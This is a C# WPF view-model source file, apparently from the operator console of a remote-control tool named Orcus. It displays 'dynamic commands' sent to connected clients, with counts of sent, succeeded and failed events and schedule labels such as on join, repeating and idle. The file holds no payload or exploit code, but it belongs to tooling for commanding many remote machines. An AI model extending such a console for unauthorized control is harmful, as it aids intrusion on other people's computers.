using System.Collections.Generic;
using System.Windows;
using Orcus.Administration.Core.ClientManagement;
using Orcus.Administration.FileExplorer.Utilities;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CrowdControl
{
    public class DynamicCommandViewModel : PropertyChangedBase
    {
        private DynamicCommandStatus _dynamicCommandStatus;
        private int _failed;
        private int _sent;
        private int _statusPosition;
        private int _succeeded;

        public DynamicCommandViewModel(RegisteredDynamicCommand registeredDynamicCommand,
            IEnumerable<ClientViewModel> executingClients)
        {
            DynamicCommand = registeredDynamicCommand;
            DynamicCommandStatus = registeredDynamicCommand.Status;
            TransmissionType = GetTransmissionName(registeredDynamicCommand.TransmissionEvent);
            ExecutionEvent = GetExecutionName(registeredDynamicCommand.ExecutionEvent);

            if (registeredDynamicCommand.DynamicCommandEvents != null)
                foreach (var dynamicCommandEvent in registeredDynamicCommand.DynamicCommandEvents)
                {
                    switch (dynamicCommandEvent.Status)
                    {
                        case ActivityType.Sent:
                            _sent++;
                            break;
                        case ActivityType.Succeeded:
                            _succeeded++;
                            break;
                        case ActivityType.Failed:
                            _failed++;
                            break;
                    }
                }

            DynamicCommandEvents =
                new FastObservableCollection<DynamicCommandEvent>(registeredDynamicCommand.DynamicCommandEvents ??
                                                                  new List<DynamicCommandEvent>());

            ExecutingClients = new FastObservableCollection<ClientViewModel>(executingClients ?? new ClientViewModel[0]);
        }

        public string Target { get; set; }
        public RegisteredDynamicCommand DynamicCommand { get; }
        public string TransmissionType { get; }
        public string CommandType { get; set; }
        public string ExecutionEvent { get; }
        public string CommandSource { get; set; }
        public FastObservableCollection<DynamicCommandEvent> DynamicCommandEvents { get; }

        public FastObservableCollection<ClientViewModel> ExecutingClients { get; }

        public int Sent
        {
            get { return _sent; }
            set { SetProperty(value, ref _sent); }
        }

        public int Succeeded
        {
            get { return _succeeded; }
            set { SetProperty(value, ref _succeeded); }
        }

        public int Failed
        {
            get { return _failed; }
            set { SetProperty(value, ref _failed); }
        }

        public DynamicCommandStatus DynamicCommandStatus
        {
            get { return _dynamicCommandStatus; }
            set
            {
                if (SetProperty(value, ref _dynamicCommandStatus))
                {
                    switch (value)
                    {
                        case DynamicCommandStatus.Pending:
                            StatusPosition = 1;
                            break;
                        case DynamicCommandStatus.Transmitting:
                            StatusPosition = 2;
                            break;
                        case DynamicCommandStatus.Done:
                            StatusPosition = 4;
                            break;
                        case DynamicCommandStatus.Active:
                            StatusPosition = 0;
                            break;
                        case DynamicCommandStatus.Stopped:
                            StatusPosition = 3;
                            break;
                    }
                }
            }
        }

        public int StatusPosition
        {
            get { return _statusPosition; }
            set { SetProperty(value, ref _statusPosition); }
        }

        public void AddCommandEvents(List<DynamicCommandEvent> dynamicCommandEvents)
        {
            foreach (var dynamicCommandEvent in dynamicCommandEvents)
            {
                switch (dynamicCommandEvent.Status)
                {
                    case ActivityType.Sent:
                        _sent++;
                        break;
                    case ActivityType.Succeeded:
                        _succeeded++;
                        break;
                    case ActivityType.Failed:
                        _failed++;
                        break;
                }
            }

            OnPropertyChanged(nameof(Sent));
            OnPropertyChanged(nameof(Succeeded));
            OnPropertyChanged(nameof(Failed));

            DynamicCommandEvents.AddItems(dynamicCommandEvents);
        }

        private static string GetTransmissionName(TransmissionEvent transmissionEvent)
        {
            if (transmissionEvent is ImmediatelyTransmissionEvent)
                return (string) Application.Current.Resources["Immediately"];
            if (transmissionEvent is DateTimeTransmissionEvent)
                return (string) Application.Current.Resources["DateAndTime"] +
                       $" ({((DateTimeTransmissionEvent) transmissionEvent).DateTime.ToLocalTime()})";
            if (transmissionEvent is OnJoinTransmissionEvent)
                return (string) Application.Current.Resources["OnJoin"];
            if (transmissionEvent is RepeatingTransmissionEvent)
                return (string) Application.Current.Resources["Repeating"] +
                       $" ({((int) ((RepeatingTransmissionEvent) transmissionEvent).TimeSpan.TotalHours):00}:{((RepeatingTransmissionEvent) transmissionEvent).TimeSpan.Minutes:00}:{((RepeatingTransmissionEvent) transmissionEvent).TimeSpan.Seconds:00})";
            if (transmissionEvent is EveryClientOnceTransmissionEvent)
                return (string) Application.Current.Resources["EveryClientOnce"];

            return null;
        }

        private static string GetExecutionName(ExecutionEvent executionEvent)
        {
            switch (executionEvent?.Id)
            {
                case 0:
                case null:
                    return (string) Application.Current.Resources["Immediately"];
                case 1:
                    return (string) Application.Current.Resources["DateAndTime"];
                case 2:
                    return (string) Application.Current.Resources["Idle"];
                default:
                    return (string) Application.Current.Resources["Unknown"];
            }
        }
    }
}